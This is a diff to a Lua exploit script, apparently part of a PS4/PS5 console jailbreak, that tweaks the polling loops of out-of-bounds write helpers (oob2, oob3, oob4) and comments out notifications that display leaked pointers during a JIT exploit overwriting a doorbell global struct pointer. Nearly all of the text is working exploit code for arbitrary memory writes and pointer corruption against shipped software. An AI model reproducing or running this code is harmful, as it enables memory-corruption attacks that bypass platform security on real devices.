@@ -50,9 +50,10 @@ local function oob2_write(target_address, target_value, pc)
     write32(DOOR3_SHM + 0x0C, 0x812)
     syscall.write(ORG_MAIN_SOCK, "3", 1)
     
-    while read32(DOOR3_SHM + 0x08) ~= 0 do end
-    -- oob2_write needs to wait longer for some reason
-    microsleep(1000000)
+    while read32(DOOR3_SHM + 0x08) ~= 0 do 
+        -- Add micro bump to make GC happy
+        microsleep(10000)
+    end
 end
 
 -- oob3 and oob4 can write vu0 or vu1 jit buffer pointer to arbitrary address
@@ -70,8 +71,10 @@ local function oob3_write(target_address, index)
     
     syscall.write(ORG_MAIN_SOCK, "3", 1)
     
-    while read32(DOOR3_SHM + 0x08) ~= 0 do end
-    microsleep(500000)
+    while read32(DOOR3_SHM + 0x08) ~= 0 do 
+        -- Add micro bump to make GC happy
+        microsleep(10000)
+    end
 end
 
 local function oob4_write(target_address, index)
@@ -87,8 +90,10 @@ local function oob4_write(target_address, index)
     
     syscall.write(ORG_MAIN_SOCK, "4", 1)
     
-    while read32(DOOR4_SHM + 0x08) ~= 0 do end
-    microsleep(500000)
+    while read32(DOOR4_SHM + 0x08) ~= 0 do 
+        -- Add micro bump to make GC happy
+        microsleep(10000)
+    end
 end
 
 -- Main jit exploit that overwrites doorbell 3 vu0 global struct pointer
@@ -166,9 +171,9 @@ local function overwrite_DOOR3_GLOBAL()
         return false, "ERROR: No valid NEW_DOOR3_GLOBAL pointer found after all attempts\nBad luck, restart the application to retry"
     end
     
-    if PLATFORM ~= "PS4" then
-        send_notification("NEW_DOOR3_GLOBAL : " .. to_hex(NEW_DOOR3_GLOBAL) .. "\nIndex : " .. string.format("0x%X", found_index))
-    end
+    -- if PLATFORM ~= "PS4" then
+        -- send_notification("NEW_DOOR3_GLOBAL : " .. to_hex(NEW_DOOR3_GLOBAL) .. "\nIndex : " .. string.format("0x%X", found_index))
+    -- end
     
     -- find OOB_ARRAY_POINTER (skip max_val_index and found_index)
     for i, entry in ipairs(cached) do
@@ -186,9 +191,9 @@ local function overwrite_DOOR3_GLOBAL()
         return false, "ERROR: No valid OOB_ARRAY_POINTER pointer found after all attempts\nBad luck, restart the application to retry"
     end
     
-    if PLATFORM ~= "PS4" then
-        send_notification("OOB_ARRAY_POINTER : " .. to_hex(OOB_ARRAY_POINTER) .. "\nIndex : " .. string.format("0x%X", found_index2))
-    end
+    -- if PLATFORM ~= "PS4" then
+        -- send_notification("OOB_ARRAY_POINTER : " .. to_hex(OOB_ARRAY_POINTER) .. "\nIndex : " .. string.format("0x%X", found_index2))
+    -- end
     
     if last_digit == 6 or last_digit == 7 then
     
@@ -282,16 +287,18 @@ local function overwrite_DOOR3_GLOBAL()
     -- Fire doorbell 3
     syscall.write(ORG_MAIN_SOCK, "3", 1)
     
-    while read32(DOOR3_SHM + 0x08) ~= 0 do end
+    while read32(DOOR3_SHM + 0x08) ~= 0 do 
+        -- Add micro bump to make GC happy
+        microsleep(10000)
+    end
     
-    microsleep(500000)
     return true
 end
 
 
 function jit_init() 
 
-    send_notification("Initializing JIT exploit...")
+    -- send_notification("Initializing JIT exploit...")
 
     -- qword_1B8460
     BRIDGE_BASE = read64(EBOOT_BASE + 0x3A19C0)
